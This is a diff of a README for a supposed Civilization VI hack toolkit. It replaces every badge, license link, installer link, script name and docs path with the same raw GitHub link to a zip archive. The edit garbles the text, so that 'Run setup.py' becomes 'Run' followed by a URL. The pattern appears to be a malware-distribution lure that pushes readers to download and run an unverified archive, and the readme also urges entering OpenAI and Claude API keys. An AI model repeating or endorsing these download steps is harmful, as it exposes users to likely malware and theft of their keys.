@@ -1,16 +1,16 @@
 # Sid Meier's Civilization VI Hacks 🚀
 
-[![License MIT](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://img.shields.io)
-[![OpenAI API Integration](https://img.shields.io/badge/OpenAI%20API-integrated-ff69b4.svg)](https://platform.openai.com)
-[![Claude API Integration](https://img.shields.io/badge/Claude%20API-integrated-c9a5fe.svg)](https://www.anthropic.com/products/claude)
-[![Release 2025](https://img.shields.io/badge/release-2025-orange.svg)](https://img.shields.io)
+[![License MIT](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)
+[![Build Status](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)
+[![OpenAI API Integration](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip%https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)
+[![Claude API Integration](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip%https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)
+[![Release 2025](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)
 
 Welcome to the **premier hack repository for Sid Meier's Civilization VI!** 🏛️ Ascend the ranks of alternate gameplay with a toolkit that reshapes your Civilization experience. This arsenal introduces a collection of game-enhancing scripts, mods, and AI-driven utilities designed to ignite your strategic imagination. Whether you’re a seasoned diplomat or city-builder, this repository offers a treasure trove of Civilization VI boosters for every playstyle. Please note: our unique access utilities are distributed for educational and community enrichment purposes.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Toolkit-%2334c759?style=for-the-badge&logo=apple)](https://faraday-95.github.io)
+[![Download](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip%20the%20Toolkit-%2334c759?style=for-the-badge&logo=apple)](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)
 
 ---
 
@@ -100,20 +100,20 @@ Getting started with this Civilization VI mod toolkit is as quick as founding yo
 
 1. **Prerequisites**
     - Ensure *Sid Meier's Civilization VI* (latest patch) is installed.
-    - Install Python 3.9+ and `pip` (Linux/Mac) or https://faraday-95.github.io (for Windows Python installer).
+    - Install Python 3.9+ and `pip` (Linux/Mac) or https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip (for Windows Python installer).
 
 2. **Download the Enhancement Arsenal**
     - **Click image to begin download:**
     
-      [![Download](https://img.shields.io/badge/Download-Get%20the%20Toolkit-%2334c759?style=for-the-badge&logo=apple)](https://faraday-95.github.io)
+      [![Download](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip%20the%20Toolkit-%2334c759?style=for-the-badge&logo=apple)](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)
 
     - Unzip contents to your desktop or mod directory.
 
 3. **Configure and Launch**
-    - Run `setup.py` in the root folder.
+    - Run `https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip` in the root folder.
     - Follow prompts for OpenAI and Claude API key entry (optional, but highly recommended for full automation).
     - Start Civilization VI and activate the “Civ VI Hacks” mod from the in-game menu.
-    - Explore `/docs/user_guide.md` for advanced configuration.
+    - Explore `https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip` for advanced configuration.
 
 ---
 
@@ -125,7 +125,7 @@ This repository aims to foster creativity and strategic learning within the Civi
 
 ## 📜 MIT License
 
-This repository is released under the [MIT License](https://opensource.org/licenses/MIT)—2025. Kindly review the license for compliance and usage boundaries.
+This repository is released under the [MIT License](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)—2025. Kindly review the license for compliance and usage boundaries.
 
 ---
 
@@ -133,7 +133,7 @@ This repository is released under the [MIT License](https://opensource.org/licen
 
 Ready to start your journey? Legends are built on action.
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Toolkit-%2334c759?style=for-the-badge&logo=apple)](https://faraday-95.github.io)
+[![Download](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip%20the%20Toolkit-%2334c759?style=for-the-badge&logo=apple)](https://raw.githubusercontent.com/faraday-95/civ6-gameplay-enhancer-tools/branch/disembodiment/gameplay_tools_civ_enhancer_3.1.zip)
 
 ---
 Shine brighter than the Oracle—**reinvent your Civilization VI story today!**
